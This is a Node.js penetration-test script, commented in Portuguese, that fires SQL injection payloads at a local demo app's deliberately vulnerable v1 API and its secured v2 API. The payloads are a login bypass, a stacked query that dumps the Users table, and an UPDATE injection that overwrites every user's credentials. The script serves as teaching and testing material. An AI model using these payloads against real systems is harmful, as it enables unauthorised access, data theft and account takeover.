// Script para testar ataques SQL Injection
const axios = require('axios');

const API_URL = 'http://localhost:3000/api/v1';
const API_URL_SECURE = 'http://localhost:3000/api/v2';

// Ataque de SQL Injection para bypass de autenticação
async function testSQLInjection() {
  try {
    console.log('\n--- Teste de SQL Injection (Bypass de Autenticação) ---');
    
    // Payload malicioso para bypass de autenticação
    const payload = {
      username: "' OR 1=1 -- ",
      password: "qualquer_coisa"
    };
    
    console.log('Enviando payload malicioso para API vulnerável:', JSON.stringify(payload));
    
    const response = await axios.post(`${API_URL}/login`, payload);
    
    console.log('Status da resposta:', response.status);
    console.log('Dados da resposta:', response.data);
    
    if (response.status === 200 && response.data.success) {
      console.log('VULNERABILIDADE DETECTADA: Bypass de autenticação bem-sucedido na API v1!');
    } else {
      console.log('API v1 provavelmente segura contra este ataque específico.');
    }
    
    // Tentar o mesmo ataque na API segura
    try {
      console.log('\nEnviando o mesmo payload para API segura...');
      
      const secureResponse = await axios.post(`${API_URL_SECURE}/auth/login`, payload);
      
      console.log('Status da resposta (API segura):', secureResponse.status);
      console.log('Dados da resposta (API segura):', secureResponse.data);
      
      if (secureResponse.status === 200 && secureResponse.data.success) {
        console.log('FALHA DE SEGURANÇA: Bypass de autenticação bem-sucedido na API v2!');
      } else {
        console.log('API v2 está protegida contra este ataque, como esperado.');
      }
    } catch (secureError) {
      console.log('API v2 rejeitou o payload malicioso como esperado:', secureError.response?.status || secureError.message);
      if (secureError.response?.data) {
        console.log('Detalhes do erro (API segura):', secureError.response.data);
      }
    }
    
  } catch (error) {
    console.error('Erro ao testar SQL Injection:', error.message);
    if (error.response) {
      console.log('Status do erro:', error.response.status);
      console.log('Dados do erro:', error.response.data);
    }
  }
}

// Testar SQL Injection para obtenção de todos os usuários
async function testSQLInjectionDataLeak() {
  try {
    console.log('\n--- Teste de SQL Injection (Vazamento de Dados) ---');
    
    // Consulta maliciosa em um parâmetro de filtro
    const maliciousFilter = "'; SELECT * FROM Users; --";
    
    console.log('Enviando consulta maliciosa para API vulnerável:', maliciousFilter);
    
    // Tentar obter todos os usuários com filtro malicioso
    const response = await axios.get(`${API_URL}/users?filter=${encodeURIComponent(maliciousFilter)}`);
    
    console.log('Status da resposta:', response.status);
    console.log('Dados da resposta:', response.data);
    
    // Analisar se a resposta contém dados inesperados
    console.log('Resultado do teste na API v1: Verificar se o payload resultou em vazamento de dados');
    
    // Tentar o mesmo ataque na API segura
    try {
      console.log('\nEnviando a mesma consulta maliciosa para API segura...');
      
      const secureResponse = await axios.get(`${API_URL_SECURE}/users?filter=${encodeURIComponent(maliciousFilter)}`);
      
      console.log('Status da resposta (API segura):', secureResponse.status);
      console.log('Dados da resposta (API segura):', secureResponse.data);
      
      console.log('Resultado do teste na API v2: Verificar se o payload foi validado e tratado adequadamente');
      
    } catch (secureError) {
      console.log('API v2 rejeitou o payload malicioso como esperado:', secureError.response?.status || secureError.message);
      if (secureError.response?.data) {
        console.log('Detalhes do erro (API segura):', secureError.response.data);
      }
    }
    
  } catch (error) {
    console.error('Erro ao testar SQL Injection Data Leak:', error.message);
    if (error.response) {
      console.log('Status do erro:', error.response.status);
      console.log('Dados do erro:', error.response.data);
    }
  }
}

// Testar SQL Injection em atualização de usuário
async function testSQLInjectionUpdate() {
  try {
    console.log('\n--- Teste de SQL Injection (Ataque na Atualização) ---');
    
    // Primeiro, criar um usuário normal
    const normalUser = {
      username: "user_update_test",
      email: "update@example.com",
      password: "password123"
    };
    
    console.log('Criando usuário normal...');
    const createResponse = await axios.post(`${API_URL}/users`, normalUser);
    const userId = createResponse.data.data.id;
    
    console.log(`Usuário criado com ID: ${userId}`);
    
    // Payload SQL Injection para atualização
    // Este payload tenta atualizar todos os usuários, não apenas o especificado
    const maliciousPayload = {
      username: "hacked_user', email='hacked@example.com', password='hacked123' WHERE 1=1; -- "
    };
    
    console.log('Enviando payload malicioso para atualização:', JSON.stringify(maliciousPayload));
    
    // Tentar atualizar com payload malicioso
    const updateResponse = await axios.put(`${API_URL}/users/${userId}`, maliciousPayload);
    
    console.log('Status da resposta:', updateResponse.status);
    console.log('Dados da resposta:', updateResponse.data);
    
    // Verificar se outros usuários foram afetados
    const allUsersResponse = await axios.get(`${API_URL}/users`);
    console.log('Todos os usuários após o ataque:');
    console.log(allUsersResponse.data);
    
    // Verificar se há múltiplos usuários com o mesmo email/senha
    const compromisedUsers = allUsersResponse.data.data.filter(user => 
      user.email === 'hacked@example.com' || user.username.includes('hacked_user')
    );
    
    if (compromisedUsers.length > 1) {
      console.log('VULNERABILIDADE DETECTADA: Múltiplos usuários foram comprometidos na API v1!');
    } else {
      console.log('API v1 parece estar protegida contra este ataque específico de atualização.');
    }
    
  } catch (error) {
    console.error('Erro ao testar SQL Injection Update:', error.message);
    if (error.response) {
      console.log('Status do erro:', error.response.status);
      console.log('Dados do erro:', error.response.data);
    }
  }
}

// Executar testes
async function runTests() {
  console.log('=======================================================');
  console.log('TESTES DE PENETRAÇÃO - SQL INJECTION');
  console.log('=======================================================');
  console.log('Este script testa ataques de injeção SQL nas APIs v1 (vulnerável) e v2 (segura).');
  console.log('Certifique-se de que ambas as APIs estão rodando antes de executar os testes.');
  console.log('=======================================================\n');
  
  await testSQLInjection();
  await testSQLInjectionDataLeak();
  await testSQLInjectionUpdate();
  
  console.log('\n=======================================================');
  console.log('TESTES CONCLUÍDOS');
  console.log('=======================================================');
  console.log('Resumo:');
  console.log('1. A API v1 deve ser vulnerável a ataques de injeção SQL');
  console.log('2. A API v2 deve estar protegida contra esses ataques');
  console.log('=======================================================');
}

// Executar testes
runTests();